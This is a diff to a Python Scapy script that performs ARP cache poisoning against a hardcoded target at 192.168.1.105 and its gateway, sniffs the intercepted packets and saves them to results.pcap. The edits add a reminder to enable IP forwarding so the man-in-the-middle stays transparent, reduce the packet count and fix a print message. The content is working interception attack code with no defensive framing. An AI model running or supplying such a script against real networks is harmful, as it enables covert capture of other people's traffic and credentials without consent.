@@ -1,3 +1,11 @@
+
+'''
+***REMEMBER TO RUN THE FOLLOWING COMMAND***
+
+    $ echo 1 > /proc/sys/net/ipv4/ip_forward
+
+'''
+
 # Import the Scapy library and its library
 from scapy.all import *
 from scapy.error import Scapy_Exception
@@ -13,7 +21,7 @@ TARGET_IP = '192.168.1.105'
 # Gateway discovered using 'arp -a'
 GATEWAY_IP  = '192.168.1.1'
 # Packet count
-COUNT       = 1000000000000
+COUNT       = 10000
 
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
     print '[*] Restoring targets...'
@@ -78,7 +86,7 @@ if __name__ == '__main__':
     poison_thread.start()
 
     try:
-        print '[*] Starting sniffer for %d packet' % COUNT
+        print '[*] Starting sniffer for %d packets' % COUNT
         bpf_filter = 'IP Host ' + TARGET_IP
         packets = sniff(count=COUNT, iface=INTERFACE)
         wrpcap('results.pcap', packets)
